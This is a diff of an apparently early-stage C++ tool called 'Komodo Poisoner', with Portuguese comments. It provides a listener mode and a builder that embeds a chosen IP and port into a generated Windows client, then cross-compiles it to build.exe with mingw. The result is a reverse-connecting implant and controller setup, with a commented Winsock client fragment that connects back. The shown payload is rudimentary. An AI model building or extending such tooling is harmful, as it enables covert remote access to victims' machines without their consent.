@@ -1,5 +1,6 @@
 #include <iostream>
 #include <string>
+#include <thread>
 
 //Socket Libs:
 #include <iostream>
@@ -44,11 +45,11 @@ int builder();
 int main(){
         system("clear");
         std::cout << "Komodo Poisoner\n";
-        std::cout << "Usage:\n";
-        std::cout << "listener -p <PORT>\nserver -h <IP> -p <PORT>\n";
-
-        std::string teste = "quebra\nde\nlinha\n";
-        std::cout << teste;
+        std::cout << "\nComandos:\n";
+        std::cout << "-h: indica o host (IP ou DDNS) do servidor\n" ;
+        std::cout << "-p: indica a porta a ser utilizada oela conexão\n";
+        std::cout << "\nExemplo:\n";
+        std::cout << "listener -p <PORT>\nbuilder -h <IP> -p <PORT>\n";
 
         std::cout << "\n$: ";
         std::cin.getline(command, command_size);
@@ -56,11 +57,10 @@ int main(){
         if(function_loader() != 0){
                 std::cout << "Erro ao extrair os parâmetros\n";
         }
-
         std::cout << "A porta é: " << port << '\n';
         std::cout << "O IP é: " << ip << '\n';
 
-return 0;
+        return 0;
 }//Fim do main
 
 int port_extractor(){
@@ -69,10 +69,8 @@ int port_extractor(){
 
         do{
                 if(command[i] == '-'){
-                        std::cout << "Hifen Encontrado\n";
                         hifen_encontrado = true;
                 }else{
-                        std::cout << "Hifen não encontrado\n";
                         ++i;
                 }
 
@@ -101,10 +99,8 @@ int ip_extractor(){
 
         do{
                 if(command[i] == '-'){
-                        std::cout << "Hifen Encontrado\n";
                         hifen_encontrado = true;
                 }else{
-                        std::cout << "Hifen não encontrado\n";
                         ++i;
                 }
 
@@ -132,36 +128,54 @@ return 0;
 
 int function_loader(){
 
-        if(command[0] == 'l'){
-                if(port_extractor() == 0){
-                        std::cout << "Porta extraida com sucesso\n";
-                }else{
-                        std::cout << "Erro ao extrair a porta\n";
-                }
+        if(parameters_found == false){
 
-                std::cout << "Iniciando Listener\n";
-                if(open_listener() != 0)
-                {
-                        std::cout << "Erro ao iniciar o Listener\n";
-                }
+        	if(command[0] == 'l'){
+        		if(port_extractor() == 0){
+        			std::cout << "Porta extraida com sucesso\n";
+        		}else{
+        			std::cout << "Erro ao extrair a porta\n";
+        		}
 
-                }else if(command[0] == 'b'){
-                        if(ip_extractor() == 0){
-                                std::cout << "IP extraido com sucesso";
-                        }else{
-                        std::cout << "Erro ao extrair o IP\n";
-                        }
+        		std::cout << "Iniciando Listener\n";
+        		std::thread listener(open_listener);
+			listener.join();
 
-                        if(port_extractor() == 0){
-                                std::cout << "Porta extraida com sucesso\n";
-                        }else{
-                                std::cout << "Erro ao extrair a porta\n";
-                        }
-        std::cout << "Chamando Builder\n";
-        builder();
-        }else{
-                std::cout << "Sintaxe Incorreta\n";
+        	}else if(command[0] == 'b'){
+        		if(ip_extractor() == 0){
+        			std::cout << "IP extraido com sucesso";
+        		}else{
+        			std::cout << "Erro ao extrair o IP\n";
+        		}
+
+        	if(port_extractor() == 0){
+        		std::cout << "Porta extraida com sucesso\n";
+        	}else{
+        		std::cout << "Erro ao extrair a porta\n";
+        	}
+        	std::cout << "Chamando Builder\n";
+        	builder();
+
+		std::cout << "\nDeseja iniciar o Listener? (s/n)\n";
+		std::cout << "$Builder$: ";
+		memset(command, 0, command_size);
+		std::cin.getline(command, command_size);
+		if(command[0] == 's' || command[0] == 'S'){
+			std::thread listener(open_listener);
+			listener.join();
+		}else{
+			exit(1);
+		}
+
+        	parameters_found = true;
+
+        	}else{
+        		std::cout << "Sintaxe Incorreta\n";
+        	}
         }
+
+//Depois de extrair os parametros começa a detectar os comandos do builder
+
 
 
         return 0;
@@ -235,13 +249,16 @@ int builder()
         arquivocpp << ip;
         arquivocpp << build_content_3;
 
-	arquivocpp.close();
+        arquivocpp.close();
 
-	std::ofstream call_compiler("call_compiller.sh");
-	call_compiler << "i686-w64-mingw32-g++ build.cpp -o build.exe -lws2_32 -mwindows -static-libgcc -static-libstdc++";
-	call_compiler.close();
-	system("chmod +x ./call_compiller.sh && ./call_compiller.sh");
-/*    
+        std::ofstream call_compiler("call_compiller.sh");
+        call_compiler << "i686-w64-mingw32-g++ build.cpp -o build.exe -lws2_32 -static-libgcc -static-libstdc++";
+        call_compiler.close();
+        system("chmod +x ./call_compiller.sh && ./call_compiller.sh");
+
+        std::cout << ".exe gerado com sucesso\n";
+
+/*
 #include <iostream>\n#include <winsock2.h>\n#include <ws2tcpip.h>\n#include <cstring>\nint main() {\nWSADATA wsaData;\nSOCKET clientSocket = INVALID_SOCKET;\nstruct sockaddr_in serverAddress;
     \nconst char* hello = \"Hello from client\";
     \nchar buffer[1024] = {0};
